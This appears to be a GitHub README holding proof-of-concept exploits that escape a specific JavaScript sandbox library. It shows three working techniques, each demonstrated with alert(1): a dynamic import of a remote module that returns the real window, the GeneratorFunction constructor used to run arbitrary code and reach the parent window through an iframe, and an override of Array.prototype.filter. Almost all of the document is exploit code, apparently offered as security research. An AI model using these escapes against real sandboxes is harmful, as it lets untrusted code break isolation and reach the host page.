# Sandbox Escape PoC

Exploits for https://github.com/wesz/javascript-sandbox

## Dynamic module import
```javascript
const modulePromise = import ("https://lgfrbcsgo.github.io/sandbox-escape-poc/module.js")

modulePromise.then(module => {
  const window = module.default()
  window.alert(1)
})
```

## GeneratorFunction
```javascript
function exec(code) {
  class Class {
    * generator () {}
  }
  
  const GeneratorFunction = Class.prototype.generator.constructor

  const { value } = GeneratorFunction([], code)().next()
  return value
}

exec(`
  const frame = document.createElement("iframe")
  document.body.appendChild(frame)
  const window = frame.contentWindow.parent
  window.alert(1)
`)
```

## Overriding Array Protoype

```javascript
[].__proto__.filter = () => []
```

On the next execution this works.
```javascript
alert(1)
```

